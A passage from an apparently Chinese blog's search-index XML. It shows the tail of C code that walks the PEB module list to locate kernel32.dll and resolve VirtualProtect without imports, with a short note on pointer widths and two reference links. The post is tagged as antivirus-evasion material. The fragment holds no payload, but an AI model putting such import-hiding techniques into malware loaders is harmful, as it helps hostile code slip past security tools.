(LIST_ENTRY*)PEB_LDR_TABLE_ENTRY;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">pListEntry = pListEntry-&gt;Flink;</span><br><span class="line">fullName = (UNICODE_STRING*)((PBYTE)pListEntry + <span class="number">0x48</span>);</span><br><span class="line">hKernel32 = (HMODULE)(*((PULONG64)((PBYTE)pListEntry + <span class="number">0x20</span>)));</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]moduleNaame: %s\n&quot;</span>, fullName-&gt;Buffer);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[*]moduleAddress: %p\n&quot;</span>, hKernel32);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ((_wcsicmp(fullName-&gt;Buffer, <span class="string">L&quot;kernel32.dll&quot;</span>)) != <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;find address....\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">apiID = <span class="built_in">GetFunctionAddress</span>((PVOID)hKernel32, (PCHAR)<span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">myVirtualProtect = (CustomVirtualProtect)(DWORD)apiID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项：取值时要注意是指针还是二重指针，数据宽度要注意</p><p>参考文章：<a href="https://bbs.kanxue.com/thread-266678.htm">https://bbs.kanxue.com/thread-266678.htm</a><br>                   <a href="http://www.youngroe.com/2015/08/01/Debug/peb-analysis/">http://www.youngroe.com/2015/08/01/Debug/peb-analysis/</a></p>]]></content>
      
      
      <categories>
          
          <category> 逆向免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向免杀 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
